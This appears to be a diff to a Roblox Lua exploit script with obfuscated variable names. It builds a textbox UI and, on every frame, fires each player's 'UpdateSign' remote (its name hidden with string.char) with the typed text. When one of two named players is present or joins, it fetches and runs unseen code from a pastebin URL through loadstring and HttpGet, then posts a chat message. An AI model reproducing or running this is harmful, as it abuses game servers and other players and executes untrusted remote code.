@@ -1,79 +1,93 @@
-                -- made by lkr --
+
 -- ( For Discord inquiries, please use the ID lkr_0000 ) --
 
+local x0 = { "gihuy10", "audio_maker6660" }
+local x1 = game:GetService("Players")
+local x2 = game:GetService("RunService")
+local x3 = game:GetService("CoreGui")
+local x4 = game:GetService("ReplicatedStorage")
+local x5 = Instance.new("ScreenGui")
+x5.Parent = x3
+local x6 = Instance.new("TextBox")
+x6.Size = UDim2.new(0, 200, 0, 40)
+x6.Position = UDim2.new(0.5, -100, 0.5, -20)
+x6.Text = ""
+x6.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+x6.BackgroundTransparency = 0.6
+x6.BorderSizePixel = 1
+x6.BorderColor3 = Color3.fromRGB(70, 70, 70)
+x6.TextColor3 = Color3.fromRGB(200, 255, 200)
+x6.Font = Enum.Font.Gotham
+x6.PlaceholderText = "unji"
+x6.TextSize = 18
+x6.TextXAlignment = Enum.TextXAlignment.Center
+x6.TextYAlignment = Enum.TextYAlignment.Center
+x6.Parent = x5
 
-local targetPlayerName = "gihuy10"
-local players = game:GetService("Players")
-local foundPlayer = false
+local function x7()
+    x5:Destroy()
+    loadstring(game:HttpGet("https://pastebin.com/raw/xKCZZnji"))()
+end
 
-for _, player in pairs(players:GetPlayers()) do
-    if player.Name == targetPlayerName then
-        foundPlayer = true
-        break
+local function x8(x9)
+    local x10 = x4:FindFirstChild("DefaultChatSystemChatEvents")
+    if x10 and x10:FindFirstChild("SayMessageRequest") then
+        x10.SayMessageRequest:FireServer(x9, "All")
     end
 end
 
-if foundPlayer then
-    loadstring(game:HttpGet("https://pastebin.com/raw/xKCZZnji"))()
-else
-    local x4 = game:GetService("Players")
-    local x12 = game:GetService("UserInputService")
-    local x5 = x4.LocalPlayer
-    local x15 = Instance.new("ScreenGui")
-    x15.Parent = game:GetService("CoreGui")
-    local x11 = Instance.new("TextBox")
-    x11.Size = UDim2.new(0, 200, 0, 40)
-    x11.Position = UDim2.new(0.5, -100, 0.5, -20)
-    x11.Text = ""
-    x11.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    x11.BackgroundTransparency = 0.6
-    x11.BorderSizePixel = 1
-    x11.BorderColor3 = Color3.fromRGB(70, 70, 70)
-    x11.TextColor3 = Color3.fromRGB(200, 255, 200)
-    x11.Font = Enum.Font.Gotham
-    x11.PlaceholderText = "unji"
-    x11.TextSize = 18
-    x11.TextXAlignment = Enum.TextXAlignment.Center
-    x11.TextYAlignment = Enum.TextYAlignment.Center
-    x11.Parent = x15
+local function x11(x12)
+    if table.find(x0, x12.Name) then
+        x7()
+        x8("This script made by lkr")
+    end
+end
 
-    local function x6(x14)
-        for _, x7 in pairs(x4:GetPlayers()) do
-            pcall(function()
-                local x8 = x7.Character
-                if x8 then
-                    local x10 = x8:FindFirstChild(string.char(85, 112, 100, 97, 116, 101, 83, 105, 103, 110), true)
-                    if x10 then
-                        x10:FireServer(x14)
-                    end
-                end
-            end)
+local function x13()
+    for _, x14 in pairs(x1:GetPlayers()) do
+        if table.find(x0, x14.Name) then
+            x7()
+            x8("This script made by lkr")
+            break
         end
     end
+end
 
-    local x13 = ""
-    local x9
-    local function x3()
-        if x9 then x9:Disconnect() end
-        x9 = game:GetService("RunService").Heartbeat:Connect(function()
-            if x13 ~= "" then
-                x6(x13)
+x1.PlayerAdded:Connect(x11)
+x13()
+
+local x15 = ""
+local x16
+local function x17()
+    if x16 then x16:Disconnect() end
+    x16 = x2.Heartbeat:Connect(function()
+        if x15 ~= "" then
+            for _, x18 in pairs(x1:GetPlayers()) do
+                pcall(function()
+                    local x19 = x18.Character
+                    if x19 then
+                        local x20 = x19:FindFirstChild(string.char(85, 112, 100, 97, 116, 101, 83, 105, 103, 110), true)
+                        if x20 then
+                            x20:FireServer(x15)
+                        end
+                    end
+                end)
             end
-        end)
-    end
-
-    x11:GetPropertyChangedSignal("Text"):Connect(function()
-        local x2 = x11.Text
-        if x2 ~= x13 then
-            x13 = x2
-            local x1 = Instance.new("Sound")
-            x1.SoundId = "rbxassetid://7293306821"
-            x1.Parent = x11.Parent
-            x1:Play()
-            x1.Ended:Connect(function()
-                x1:Destroy()
-            end)
-            x3()
         end
     end)
 end
+
+x6:GetPropertyChangedSignal("Text"):Connect(function()
+    local x21 = x6.Text
+    if x21 ~= x15 then
+        x15 = x21
+        local x22 = Instance.new("Sound")
+        x22.SoundId = "rbxassetid://7293306821"
+        x22.Parent = x6.Parent
+        x22:Play()
+        x22.Ended:Connect(function()
+            x22:Destroy()
+        end)
+        x17()
+    end
+end)
